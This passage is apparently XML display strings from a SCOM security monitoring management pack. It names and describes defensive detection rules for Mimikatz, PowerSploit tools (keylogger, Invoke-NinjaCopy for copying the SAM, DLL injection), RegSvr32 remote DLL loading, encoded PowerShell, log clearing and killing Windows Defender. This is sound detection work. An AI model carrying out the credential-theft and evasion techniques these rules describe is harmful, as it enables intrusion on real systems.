        <DisplayString ElementID="Security.Monitoring.SecurityMonitoringDA.MemberServers" SubElementID="DomainDnsName">
          <Name>Domain Name</Name>
          <Description>Domain DNS Name for Monitored Member Servers.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoringDARelationships">
          <Name>Security Monitoring DA Relationships</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoringDARelationshipsForDCs">
          <Name>Security Monitoring DA Relationship for Domain Controller Class</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoringDARelationshipsForMemberServers">
          <Name>Security Monitoring DA Relationships for Member Servers</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoringDARelationshipsforMS">
          <Name>Security Monitoring DA Relationship for OS Class</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.WriteableLocations">
          <Name>Security Monitoring: OS User Writeable Locations</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.WriteableLocations" SubElementID="FolderPath">
          <Name>Folder Path</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.WriteableLocationsSeedClass">
          <Name>Security Monitoring: User Writeable Directories Seed Class</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.EventCollection.AccountLockouts">
          <Name>Security Monitoring: Collect Account Lockout Information</Name>
          <Description>This collection rule will search the security logs for event ID 4740 and will be used to populate a report with account lockout information</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Collect.SMBv1Connections">
          <Name>Security Monitoring: Collect SMBv1 Connections</Name>
          <Description>Description for the new rule</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.CollectLegacyTLSEvents">
          <Name>Security Monitoring: Collect Legacy TLS Events</Name>
          <Description>This collection rule will collect events created from TLS 1.0 or TLS 1.1. Run the associated report to see where this is happening in your environment. </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.EventCollection.LanMan">
          <Name>Security Monitoring:  Collect LANMAN Authentication</Name>
          <Description>Collection rule to collect all authentication events using LanManager to authenticate. This is an old protocol that has known vulnerabilities and should be shut off.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.CollectionRule.CollectLAPSEvents">
          <Name>Security Monitoring: Collect LAPS Events</Name>
          <Description>Collect LAPS Events.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.EventCollection.NTLMV1">
          <Name>Security Monitoring: Collect NTLMV1 Events</Name>
          <Description>Collection rule to collect all authentication events using NTLMv1 to authenticate. This is an old protocol that has known vulnerabilities and should be shut off.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.EventCollection.WdigestAuthentication">
          <Name>Security Monitoring: Collect WDigest Authentication Events</Name>
          <Description>If the proper audit policies are turned on, this rule will collect WDigest logons.  See https://blogs.technet.microsoft.com/kfalde/2014/11/02/kb2871997-and-wdigest-part-2/ for details</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AdminAccountDiscovery">
          <Name>Security Monitoring: Discover Admin Accounts</Name>
          <Description>This discovery, once enabled will discover all admin accounts. NOTE: Enable for only one machine and enable on a machine that has the AD PowerShell Module installed.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PDCEmulatorDiscovery">
          <Name>Security Monitoring: Discover PDC Emulator</Name>
          <Description>This discovery will run against any domain controller and determine if it is the PDC Emulator. This allows targeting for events that duplicate on the PDC and the logging DC.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.DiscoverWriteableFileLocations">
          <Name>Security Monitoring: Discover Writeable File Locations</Name>
          <Description>This will discover writeable file locations in windows or program files</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.DA.DCDiscovery">
          <Name>Security Monitoring: Distributed App DC Discovery</Name>
          <Description>Populates Security Monitoring Distributed Application</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.DA.MSDiscovery">
          <Name>Security Monitoring: Distributed App MemberServer Discovery</Name>
          <Description>Populates Security Monitoring Distributed Application</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PopulateExtendedWriteableDirectoryComputerGroup">
          <Name>Security Monitoring: Populate Extended Writeable Directory Monitoring Group</Name>
          <Description>This discovery will put the windows computer objects in a group that can be used for overrides.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Discoveries.UserWriteableLocationSeed">
          <Name>Security Monitoring: User Writeable Directories Seed Class</Name>
          <Description>If Registry Keyey to discover user writeable locations on a server is populated, this discovery will initiate the seed discovery</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.SeDebugPrivilegeEscalation">
          <Name>Security Monitoring: SeDebugPrivilege Escalation Detected</Name>
          <Description>This alert is generated when a process other than WMI assigns itself debug privileges.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.SeDebugPrivilegeEscalation.AlertMessage">
          <Name>Security Monitoring: SeDebugPrivilege Escalation Detected</Name>
          <Description>
            See this article for details.
            https://nathangau.wordpress.com/2018/01/25/security-monitoring-a-possible-new-way-to-detect-privilege-escalation/

            {0}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoring.Event.DCOUModify">
          <Name>Security Monitoring: Modification has been made to the DC OU</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoring.Event.DCOUModify.AlertMessage">
          <Name>Security Monitoring: Modification has been made to the DC OU</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ExecutableRunFromUserWriteableDirectory">
          <Name>Security Monitoring: Executable Run from User Writeable Windows Directory</Name>
          <Description>This rule looks for process creation from executables being run from key windows directories where processes should not be run.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ExecutableRunFromUserWriteableDirectory.AlertMessage">
          <Name>Security Monitoring: Executable Run from User Writeable Windows Directory</Name>
          <Description>
            This rule looks for process creation from executables being run from key windows directories where processes should not be run.

            See https://nathangau.wordpress.com/2018/09/04/security-monitoring-using-scom-to-detect-executables-run-in-writeable-os-directories-part-1/ for details.

            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended">
          <Name>Security Monitoring: Executable Run from User Writeable Windows Directory Extended</Name>
          <Description>This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended.AlertMessage">
          <Name>Security Monitoring: Executable Run from User Writeable Windows Directory Extended</Name>
          <Description>
            This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.
            See https://nathangau.wordpress.com/2018/09/06/security-monitoring-using-scom-to-detect-executables-run-in-writeable-os-directories-part-2/ for details.

            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.4688.GenericCryptoRansomWare">
          <Name>Security Monitoring:  Possible Crypto-Ransomware Installed on Computer</Name>
          <Description>This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.4688.GenericCryptoRansomWare.AlertMessage">
          <Name>Security Monitoring:  Possible Crypto-Ransomware Installed on Computer</Name>
          <Description>
            This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.
            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoring.Event.GPOCreation">
          <Name>Security Monitoring: A GPO was Created</Name>
          <Description>A new GPO has been created</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoring.Event.GPOCreation.AlertMessage">
          <Name>Security Monitoring: A GPO was Created</Name>
          <Description>A GPO was created.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule">
          <Name>Security Monitoring: A GPO was Deleted</Name>
          <Description>This rule detects the deletion of a GPO</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule.AlertMessage">
          <Name>Security Monitoring: A GPO was Deleted</Name>
          <Description>
            A GPO was deleted
            Event Description: {0}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.KillWindowsDefender">
          <Name>Security Monitoring:  An attempt was made to kill Windows Defender</Name>
          <Description>This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on. </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.KillWindowsDefender.AlertMessage">
          <Name>Security Monitoring:  An attempt was made to kill Windows Defender</Name>
          <Description>
            This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.
            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.ByPassExecutionPolicy">
          <Name>Security Monitoring:  PowerShell script run natively to bypass existing execution policy</Name>
          <Description>This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details. </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.ByPassExecutionPolicy.AlertMessage">
          <Name>Security Monitoring:  PowerShell script run natively to bypass existing execution policy</Name>
          <Description>
            This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.
            Logging Computer: {0}

            User Name: {1}


            Process Name: {2}

            Command Line: {3}
            
            Calling Application: {4}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.InvokeEncodedCommand">
          <Name>Security Monitoring:  PowerShell used to Invoke an Encoded Command</Name>
          <Description>One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.InvokeEncodedCommand.AlertMessage">
          <Name>Security Monitoring:  PowerShell used to Invoke an Encoded Command</Name>
          <Description>
            One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.
            Logging Computer: {0}

            User Name: {1}


            Process Name: {2}

            Command Line: {3}

            Calling Application: {4}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.InvokeRemoteExpression">
          <Name>Security Monitoring:  PowerShell used to Invoke a Remote Expression</Name>
          <Description>This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.InvokeRemoteExpression.AlertMessage">
          <Name>Security Monitoring:  PowerShell used to Invoke a Remote Expression</Name>
          <Description>
            This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}

            Calling Application: {4}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.PowerShellRuninMemoryOnly">
          <Name>Security Monitoring:  PowerShell Running Only in Memory</Name>
          <Description>There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://blogs.technet.microsoft.com/nathangau/2018/09/07/security-monitoring-additional-powershell-detections/ for details.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.PowerShellRuninMemoryOnly.AlertMessage">
          <Name>Security Monitoring:  PowerShell Running Only in Memory</Name>
          <Description>
            There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://blogs.technet.microsoft.com/nathangau/2018/09/07/security-monitoring-additional-powershell-detections/ for details.
            Logging Computer: {0}

            User Name: {1}


            Process Name: {2}

            Command Line: {3}

            Calling Application: {4}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.RemoteRegSvr32">
          <Name>Security Monitoring:  RegSvr32 used to load a DLL that is not located on this machine</Name>
          <Description>A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details. </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.RemoteRegSvr32.AlertMessage">
          <Name>Security Monitoring:  RegSvr32 used to load a DLL that is not located on this machine</Name>
          <Description>
            A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.
            Logging Computer: {0}

            User Name: {1}
  
            Process Name: {2}
            
            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer">
          <Name>Security Monitoring: A Scheduled Task Was Created On Server</Name>
          <Description>A scheduled task was created on this server.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer.AlertMessage">
          <Name>Security Monitoring: A Scheduled Task Was Created On Server</Name>
          <Description>This rule tracks the creation of a scheduled task on a server. Note that there are 5 overrideable parameters to allow you to override based on the name of a scheduled task that is common in your environment. Use this for to override internal tools that create tasks.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityLogClearedv2">
          <Name>Security Monitoring: Security Event Log was Cleared.</Name>
          <Description>This rule monitors the security log for a log clearing event.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityLogClearedv2.AlertMessage">
          <Name>Security Monitoring: Security Event Log was cleared</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC">
          <Name>Security Monitoring: A service was Created on a Domain Controller</Name>
          <Description>This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC.AlertMessage">
          <Name>Security Monitoring: A service was Created on a Domain Controller</Name>
          <Description>
            A service was created on a domain controller. This should be investigated to ensure that this service is a legitimate application.

            Event Description: {0}

            Logging Computer: {1}

            User Name: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SuspiciousUserContext">
          <Name>Security Monitoring: A Command was run from a Suspicious User location</Name>
          <Description>This generates alerts off of commands being run from non-traditional user locations.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SuspiciousUserContext.AlertMessage">
          <Name>Security Monitoring: A command was run from a suspicious user location</Name>
          <Description>
            See https://nathangau.wordpress.com/2020/04/21/security-monitoring-using-scom-to-capture-suspicious-user-activity/ for details on this rule.

            Logging Computer: {0}

            User Name: {1}


            Process Name: {2}

            Command Line: {3}

            Calling Application: {4}

          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SystemLogClearedv2">
          <Name>Security Monitoring: System Event Log was Cleared.</Name>
          <Description>This rule monitors the system log for a log clearing event.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SystemLogClearedv2.AlertMessage">
          <Name>Security Monitoring: System Event Log was cleared</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.WMIPersistence">
          <Name>Security Monitoring:  Possible WMI Persistence Event Detected</Name>
          <Description>See this article for details.  https://nathangau.wordpress.com/2019/03/06/using-scom-to-detect-wmi-persistence-attempts/</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.WMIPersistence.AlertMessage">
          <Name>Security Monitoring:  Possible WMI Persistence Event Detected</Name>
          <Description>
            Event Description: {0}

            Logging Computer: {1}

            See this article for details.  https://nathangau.wordpress.com/2019/03/06/using-scom-to-detect-wmi-persistence-attempts/</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.WMIRemote.Destination">
          <Name>Security Monitoring:  Possible WMI Remote Attempt Made To this System</Name>
          <Description>See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/ </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.WMIRemote.Destination.AlertMessage">
          <Name>Security Monitoring:  Possible WMI Remote Attempt Made To this System</Name>
          <Description>
            See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/

            Logging Computer: {0}

            Command Line: {1}

            User Context: {2}

          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.WMIRemote.Source">
          <Name>Security Monitoring:  Possible WMI Remote Attempt Made From this System</Name>
          <Description>See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/ </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Event.WMIRemote.Source.AlertMessage">
          <Name>Security Monitoring:  Possible WMI Remote Attempt Made From this System</Name>
          <Description>
            See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/

            Logging Computer: {0}

            Target Server Name: {1}

          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.DebugEscalation">
          <Name>Security Monitoring Forwarded Events: SeDebug Privilege Escalation Detected</Name>
          <Description>This alert is generated when a process other than WMI assigns itself debug privileges.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.DebugEscalation.AlertMessage">
          <Name>Security Monitoring Forwarded Events: SeDebugPrivilege Escalation Detected</Name>
          <Description>
            See article for details
            https://nathangau.wordpress.com/2018/01/25/security-monitoring-a-possible-new-way-to-detect-privilege-escalation/

            {0}</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.ExecutableRunFromUserWriteableDirectory">
          <Name>Security Monitoring Forwarded Events: Executable Run from User Writeable Windows Directory</Name>
          <Description>This rule looks for process creation from executables being run from key windows directories where processes should not be run.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.ExecutableRunFromUserWriteableDirectory.AlertMessage">
          <Name>Security Monitoring Forwarded Events: Executable Run from User Writeable Windows Directory</Name>
          <Description>
            This rule looks for process creation from executables being run from key windows directories where processes should not be run.

            See https://nathangau.wordpress.com/2018/09/04/security-monitoring-using-scom-to-detect-executables-run-in-writeable-os-directories-part-1/ for details.

            Logging Computer: {0}

            User Name: {1}


            Process Name: {2}

            Command Line: {3}</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.FindAVSignature">
          <Name>Security Monitoring Forwarded Events:  PowerSploit FindAV Signature Tool is in Use</Name>
          <Description>Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.FindAVSignature.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  PowerSploit FindAV Signature Tool is in Use</Name>
          <Description>Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.  See https://blogs.technet.microsoft.com/nathangau/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.4688.GenericCryptoRansomWare">
          <Name>Security Monitoring Forwarded Events:  Possible Crypto-Ransomware Installed on Computer</Name>
          <Description>This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.4688.GenericCryptoRansomWare.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  Possible Crypto-Ransomware Installed on Computer</Name>
          <Description>
            This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.GetDLLLoadPath">
          <Name>Security Monitoring ForwardedEvents:  Powersploit Get DLL Load Path is in Use</Name>
          <Description>Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.GetDLLLoadPath.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  Powersploit Get DLL Load Path is in Use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.GetHTTPStatus">
          <Name>Security Monitoring Forwarded Events:  PowerSploit HTTP Path Discovery Tool is in Use</Name>
          <Description>This tool is used to dictionary a web server to determine the status of a path.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.GetHTTPStatus.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  PowerSploit HTTP Path Discovery Tool is in Use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.GetKeystroke">
          <Name>Security Monitoring Forwarded Events:  PowerSploit Key Stroke Logger in Use</Name>
          <Description>This is a PowerSploit tool that can be used to log key strokes.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.GetKeystroke.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  PowerSploit Key Stroke Logger in Use</Name>
          <Description> See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.
          
          Logging Computer: {0}

User Name: {1}

Event Description: {2}</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.InvokeDLLInjection">
          <Name>Security Monitoring:  PowerSploit Invoke DLL Injection Command in Use</Name>
          <Description>A PowerSploit tool used to inject code into DLL files is in use in the environment.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.InvokeDLLInjection.AlertMessage">
          <Name>Security Monitoring:  PowerSploit Invoke DLL Injection Command in Use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokeMimikatz">
          <Name>Security Monitoring Forwarded Events:  Invoke-Mimikatz Detected in Tier 0 Environment</Name>
          <Description>Description for the new alert rule.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokeMimikatz.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  Invoke-Mimikatz in use in your Tier 0 environment</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokeNinjaCopy">
          <Name>Security Monitoring Forwarded Events:  Invoke Ninja Copy is in Use</Name>
          <Description>This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokeNinjaCopy.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  Invoke Ninja Copy is in Use</Name>
          <Description> See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.
          
          Logging Computer: {0}

User Name: {1}

Event Description: {2}</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokePortScan">
          <Name>Security Monitoring Forwarded Events:  Invoke Portscan is in Use</Name>
          <Description>This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokePortScan.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  Invoke Portscan is in Use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokeShellCodeInUse">
          <Name>Security Monitoring:  Invoke ShellCode is in Use</Name>
          <Description>Description for the new alert rule.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokeShellCodeInUse.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  Invoke Shell Code is in Use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.KillWindowsDefender">
          <Name>Security Monitoring Forwarded Events:  An attempt was made to kill Windows Defender</Name>
          <Description>This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on. </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.KillWindowsDefender.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  An attempt was made to kill Windows Defender</Name>
          <Description>
            This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.
            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.CollectLAPSEvents">
          <Name>Security Monitoring Forwarded Events: Collect LAPS Events</Name>
          <Description>Description for the new event collection rule.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.ByPassExecutionPolicy">
          <Name>Security Monitoring Forwarded Events:  PowerShell script run natively to bypass existing execution policy</Name>
          <Description>This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details. </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.ByPassExecutionPolicy.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  PowerShell script run natively to bypass existing execution policy</Name>
          <Description>
            This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}

            Calling Application: {4}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.PowerShellStartHiddenProcess">
          <Name>Security Monitoring Forwarded Events:  Hidden Process Starting Using PowerShell</Name>
          <Description>Description for the new alert rule.</Description>
        </DisplayString>
